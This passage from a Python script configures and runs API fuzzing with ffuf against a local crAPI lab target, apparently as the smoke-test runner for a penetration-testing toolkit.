                    ["-fc", "404,400", "-maxtime", "20", "-maxtime-job", "12", "-s"]
                    if full_main else
                    []
                ),
                "rps": 20,
                "quick": not full_main,
                "payload_cap": 12 if full_main else 2,
                "max_endpoints": max_eps,
                "openapi_url": openapi_url,
            },
        ),
    ]

    if not full_main:
        print("Running quick smoke mode. Set PENTAFORGE_FUZZ_MAIN_FULL=1 for full run.")
    else:
        print(f"Running full profile mode (profile={profile}).")

    if auto_crapi_target:
        print("Auto-detected local crAPI target. Using crAPI endpoint profile in quick mode.")

    if profile == "crapi" and not shared_headers.get("Authorization"):
        print("Warning: no auth token provided. Set PENTAFORGE_FUZZ_AUTH_TOKEN for authenticated crAPI coverage.")
    if profile == "crapi" and not openapi_url:
        print("Tip: set PENTAFORGE_FUZZ_OPENAPI_URL to include full schema-driven endpoint discovery.")

    for name, kwargs in cases:
        if name == "ffuf" and not _which(name):
            print(f"=== {name.upper()} ===")
            print(json.dumps({"success": False, "tool": name, "error": f"{name} not on PATH"}, indent=2))
            continue

        print(f"=== {name.upper()} ===")
        result = api_fuzzing(**kwargs)
        print(json.dumps(result, indent=2))
